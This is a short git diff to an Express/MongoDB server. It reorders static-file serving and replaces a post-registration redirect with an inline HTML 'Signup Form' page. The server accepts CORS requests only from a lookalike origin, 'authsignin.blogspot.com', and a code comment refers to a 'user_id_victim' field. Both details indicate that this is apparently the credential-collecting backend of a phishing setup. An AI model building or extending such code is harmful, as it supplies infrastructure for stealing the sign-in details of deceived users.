@@ -4,6 +4,7 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 5000;
 const cors = require('cors');
+app.use(express.static(path.join(__dirname, '../public')));
 app.use(cors({
     // Replace with your specific origin
     origin: 'https://authsignin.blogspot.com'
@@ -36,7 +37,6 @@ const userSchema = new mongoose.Schema({
 const User = mongoose.model('User', userSchema);
 
 app.use(express.json());
-app.use(express.static(path.join(__dirname, '../public')));
 
 // Default route
 app.get('/', (req, res) => {
@@ -57,7 +57,17 @@ app.post('/register', async (req, res) => {
 
         // If you need to store user_id_victim and type, add those fields to your schema as well.
         await newUser.save();
-        res.redirect('/index.html');
+        res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Signup Form</title>
+</head>
+<body>
+  <h2>Signup Form</h2>
+     
+</body>
+</html>`);
     } catch (error) {
         res.status(500).json({ error: 'Error registering user', details: error.message });
     }
